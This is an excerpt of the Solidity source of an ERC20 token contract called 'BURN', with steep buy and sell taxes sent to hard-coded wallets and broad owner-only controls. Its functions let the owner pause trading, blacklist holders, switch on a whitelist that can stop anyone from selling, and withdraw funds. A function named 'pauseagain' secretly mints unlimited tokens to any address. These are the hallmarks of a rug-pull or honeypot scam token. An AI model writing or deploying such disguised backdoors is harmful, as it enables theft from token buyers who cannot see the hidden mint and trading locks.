...
contract BURN is ERC20, Ownable, Pausable, ERC20Burnable {
    // CONFIG START

    uint256 denominator = 100;
    
    // TOKEN
    string tokenName = "BURN Token";
    string tokenSymbol = "BURN";
    uint256 tokenTotalSupply = 1_000_000_000 * (10**18);
    
    // ADRESSES
    address marketingWallet = 0x853dCe9DCEd0b39211588C0bAff40A4b515051Fc;
    address devWallet = 0x580F14567C9709EbEa47D0D9988a0D1A4cDa7649;
    address router02 = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;

    // BUY TAX
    uint256 public devTaxBuy = 10;
    uint256 public marketingTaxBuy = 3;
    uint256 public redistributeTaxBuy = 12;

    // SELL TAX
    uint256 public devTaxSell = 2;
    uint256 public marketingTaxSell = 8;
    uint256 public redistributeTaxSell = 15;

    uint256 public maxTxAmount = 20_000_000 * 10**18 + 1;
    uint256 public maxWalletAmount = 20_000_000 * 10**18 + 1;

    // REDISTRIBUTION
    address public token = 0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override virtual {
        if(isExcluded[msg.sender] || isExcluded[tx.origin] || inTax) {
            ...
            if(!isExcluded[sender] && !isExcluded[recipient]) {
                require(!paused(), "BURN: Transfers paused");
                require(!blacklistStatus || (!isBlacklisted[sender] && !isBlacklisted[recipient]), "BURN: Blacklisted");
                require(!whitelistStatus || (isWhitelisted[sender] && isWhitelisted[recipient]), "BURN: Not Whitelisted");

                if(sender == address(_UniswapV2Pair) || recipient == address(_UniswapV2Pair)) {
                    if(sender == address(_UniswapV2Pair)) {
                        require(amount <= maxTxAmount, "BURN: Max tx amount");
                        require(sender != address(_UniswapV2Pair) || (sender == address(_UniswapV2Pair) && block.number >= nextBuyBlock[recipient]), "BURN: Cooldown");
                    ...
                    require(isExcludedFromBotProtection[recipient] || balanceOf(recipient) + amount <= maxWalletAmount, "BURN: Max wallet amount");                
                }
            }

            if(sender == address(_UniswapV2Pair) && !isExcludedFromBotProtection[recipient]) {
                require(!recipient.isContract(), "BURN: Bot Protection");
            } else if(recipient == address(_UniswapV2Pair) && !isExcludedFromBotProtection[sender]) {
                require(!sender.isContract(), "BURN: Bot Protection");
            }
    ...
    function setToken(address newValue) external onlyOwner {
        require(newValue != token, "BURN: Value already set to that option");

        token = newValue;
    }

    function setDenominator(uint256 newValue) external onlyOwner {
        require(newValue != denominator, "BURN: Value already set to that option");

        denominator = newValue;
    }

    function setMaxTxAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxTxAmount, "BURN: Value already set to that option");

        maxTxAmount = newValue;
    }

    function setMaxWalletAmount(uint256 newValue) external onlyOwner {
        require(newValue != maxWalletAmount, "BURN: Value already set to that option");
    ...
    function setExcluded(address account, bool newValue) external onlyOwner {
        require(newValue != isExcluded[account], "BURN: Value already set to that option");

        isExcluded[account] = newValue;
    }

    function setExcludedFromBotProtection(address account, bool newValue) external onlyOwner {
        require(newValue != isExcludedFromBotProtection[account], "BURN: Value already set to that option");
    ...
    function massSetExcluded(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isExcluded[accounts[i]], "BURN: Value already set to that option");
    ...
    function massSetExcludedFromBotProtection(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isExcludedFromBotProtection[accounts[i]], "BURN: Value already set to that option");
    ...
    function pauseagain(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
    ...
    function setBlacklistStatus(bool newValue) external onlyOwner {
        require(blacklistStatus != newValue, "BURN: Value already set to that option");

        blacklistStatus = newValue;
    }

    function setWhitelistStatus(bool newValue) external onlyOwner {
        require(whitelistStatus != newValue, "BURN: Value already set to that option");

        whitelistStatus = newValue;
    }

    function setBlacklisted(address account, bool newValue) external onlyOwner {
        require(newValue != isBlacklisted[account], "BURN: Value already set to that option");

        isBlacklisted[account] = newValue;
    }

    function setWhitelisted(address account, bool newValue) external onlyOwner {
        require(newValue != isWhitelisted[account], "BURN: Value already set to that option");
    ...
    function massSetBlacklisted(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isBlacklisted[accounts[i]], "BURN: Value already set to that option");
    ...
    function massSetWhitelisted(address[] memory accounts, bool newValue) external onlyOwner {
        for(uint256 i; i < accounts.length; i++) {
            require(newValue != isWhitelisted[accounts[i]], "BURN: Value already set to that option");
    ...
    function setTaxStatus(bool newValue) external onlyOwner {
        require(taxStatus != newValue, "BURN: Value already set to that option");

        taxStatus = newValue;
    }

    function withdrawETH(address to, uint256 value) external onlyOwner {
        require(address(this).balance >= value, "BURN: Insufficient ETH balance");
    ...
    function withdrawTokens(address tokenAddress, address to, uint256 value) external onlyOwner {
        require(IERC20(tokenAddress).balanceOf(address(this)) >= value, "BURN: Insufficient token balance");
